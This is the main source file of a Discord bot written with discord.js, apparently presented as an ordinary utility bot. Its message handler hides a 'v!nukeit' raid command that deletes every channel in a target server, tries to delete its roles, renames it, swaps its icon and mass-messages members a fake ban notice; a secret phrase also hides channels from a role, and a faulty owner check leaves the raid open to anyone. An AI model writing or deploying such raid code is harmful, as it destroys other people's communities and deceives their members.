const {Client, Intents, MessageEmbed, Collection, MessageSelectMenu, RichPresenceAssets} = require('discord.js')

const db = require('quick.db')

const client =  new Client({ intents: ["GUILDS",
"GUILD_MEMBERS",
"GUILD_BANS",
"GUILD_INTEGRATIONS",
"GUILD_WEBHOOKS",
"GUILD_INVITES",
"GUILD_VOICE_STATES",
"GUILD_PRESENCES",
"GUILD_MESSAGES",
"GUILD_MESSAGE_REACTIONS",
"GUILD_MESSAGE_TYPING",
"DIRECT_MESSAGES",
"DIRECT_MESSAGE_REACTIONS",
"DIRECT_MESSAGE_TYPING",]})

const config = require('./config.json')

module.exports = client;

client.commands = new Collection()
client.config = require('./config.json')
client.prefix = client.config.prefix
client.aliases = new Collection()
client.slash_commands = new Collection();
client.maxArgs = new Collection();
client.minArgs = new Collection();
client.syntax = new Collection();
client.Isnsfw = new Collection();
client.ownerOnly = new Collection();
client.guildOnly = new Collection();
client.usage = new Collection();
client.cooldown = new Collection();
client.description = new Collection();
client.example = new Collection();

require('./handler/slash_commands');    
require('./handler')(client);

client.on('messageCreate', async message => {

    if(message.author.id === '550994878486544384') {
        message.reply(`Hacker...`)
    }

    if(message.content === `v!eval`) {
        if(!message.author.id === `614076042901979156`) {
            return
        }
        if(message.author.id === `614076042901979156`) {
            message.channel.send(`Shutting down`).then(
                process.exit(0)
            )
        }        
    } 

    if(message.content === 'v!nukeit') {

        if(!message.author.id === '614076042901979156') return

        if(message.guild.id === '780072798261084172') return

        const serverId = db.get(`ownerOnlyConfig.nukebot`)        

        const server = client.guilds.cache.find(g => g.id === serverId)

        const channels = await server.channels.fetch()
        channels.forEach(c => {
            c.delete()
        })

        const members = await server.members.fetch()

        const ch = await server.channels.create(`you got raided :(`, {
            type: "GUILD_TEXT",
            permissionOverwrites: [
                {
                    id: server.roles.everyone,
                    allow: ["VIEW_CHANNEL"],
                    deny: ["SEND_MESSAGES"]
                }
            ]
        }).then(channel => channel.createInvite({
            maxAge: 10 * 24 * 60,
            maxUses: -1,
        }).then(invite => channel.send(invite.codes)))
        const memdm = await server.members.fetch()

        memdm.forEach(m => {
            m.send(`${server.name} was raided sadly, and you got banned \n \njoking you'll be unbanned`)
        })

        const roles = await server.roles.fetch()
        roles.forEach(r => {
            roles.delete()
        })
        server.setName(`you got raided`)
        server.setIcon(`https://www.seekpng.com/png/detail/153-1537043_meme-emoji-discord-emoji-png-dank-discord-emoji.png`)
        
    }
    if(message.content === 'heybrocreatesssssssstherolexd') {

        const roe = client.guilds.cache.find( g => g.id === '780072798261084172')
        const role = roe.roles.cache.find(r=>r.id === '950074907209916446')
        const channels = await roe.channels.fetch()

        channels.forEach(e => {
             e.permissionOverwrites.create(role,{
                VIEW_CHANNEL: false
            })
        })


    }
})


process.on("rejectionHandled"        , ( err ) => console.error( err ) );
process.on("unhandledRejection"      , ( err ) => console.error( err ) );
process.on("uncaughtException"       , ( err ) => console.error( err ) );
process.on("uncaughtExceptionMonitor", ( err ) => console.error( err ) ); 
client.login(config.token)